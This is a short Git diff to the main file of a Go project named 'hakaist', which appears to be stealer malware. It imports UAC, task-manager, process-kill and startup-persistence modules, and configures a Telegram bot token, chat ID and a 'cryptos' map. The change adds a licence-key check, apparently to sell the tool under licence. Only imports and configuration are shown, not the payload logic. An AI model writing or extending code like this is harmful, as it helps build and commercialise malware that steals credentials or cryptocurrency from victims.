@@ -10,6 +10,7 @@ import (
 	TaskManager "github.com/lukyydnv/hakaist/internal/taskmanager"
 	Uac "github.com/lukyydnv/hakaist/internal/uac"
 	"github.com/lukyydnv/hakaist/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/pkg/utils/license"
 	"github.com/lukyydnv/hakaist/pkg/utils/processkill"
 	"github.com/lukyydnv/hakaist/pkg/utils/startup"
 
@@ -26,9 +27,12 @@ import (
 
 var botToken string
 var chatId string
+var licenseKey string
 
 func main() {
-	CONFIG := map[string]interface{}{
+	license.Check(licenseKey)
+	
+	CONFIG := map[string]any{
 		"botToken": botToken,
 		"chatId":   chatId,
 		"cryptos": map[string]string{
